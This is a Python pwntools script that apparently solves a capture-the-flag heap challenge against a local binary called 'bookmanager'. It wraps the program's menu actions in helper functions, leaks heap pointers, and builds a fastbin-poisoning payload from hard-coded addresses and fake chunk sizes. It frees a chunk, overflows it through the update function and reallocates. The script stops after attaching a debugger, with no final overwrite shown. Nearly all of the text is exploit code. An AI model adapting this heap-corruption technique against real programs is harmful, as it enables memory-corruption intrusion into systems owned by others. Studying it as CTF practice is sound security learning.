from pwn import * 

def bookname(data):
	p.recv()
	p.send(data)
	p.recv()

def addchap(data):
	p.sendline("1")
	p.recv()
	p.send(data)
	p.recv()

def addsec(name, data):
	p.sendline("2")
	p.recv()
	p.send(name)
	p.recvuntil("0x0x")
	result =int(p.recvuntil("\n"),16)
	p.recv()
	p.send(data)
	p.recv()
	return result

def addtext(name,size,data):
	p.sendline("3")
	p.recv()
	p.send(name)
	p.recv()
	p.sendline(str(size))
	p.recv()
	p.send(data)
	p.recv()

def rmchap(name):
	p.sendline("4")
	p.recv()
	p.sendline(name)
	p.recv()

def rmsec(name):
	p.sendline("5")
	p.recv()
	p.send(name)
	p.recv()

def rmtext(name):
	p.sendline("6")
	p.recv()
	p.send(name)
	p.recv()

def update(tp,name,new):
	p.sendline("8")
	p.recv()
	p.sendline(tp)
	p.recv()
	p.sendline(name)
	p.recv()
	p.send(new)
	p.recv()

def show():
	p.sendline("7")
	p.recv()

context.log_level = 'debug'
p = process('./bookmanager')
bookname('mcl')
addchap('mcl')
pointer1 = addsec("mcl","sec1")
pointer2 = addsec("mcl","sec2")
pointer3 = addsec("mcl","sec3")
pointer4 = addsec("mcl","sec4")
pointer5 = addsec("mcl","sec5")

addtext("sec1",0x60,"text1")
addtext("sec2",0x60,"text2")
addtext("sec3",0x60,"text3")
gdb.attach(p)
padding = p64(0x7ffff7dd1aed)+p64(0)*12 +p64(0x71)+p64(0x555555758260)+p64(0)*12+p64(0x71)
rmtext("sec2")
update("Text","sec1",padding)
addtext("sec1",0x60,"text1")
addtext("sec1",0x60,"text1")
addtext("sec1",0x60,"text1")



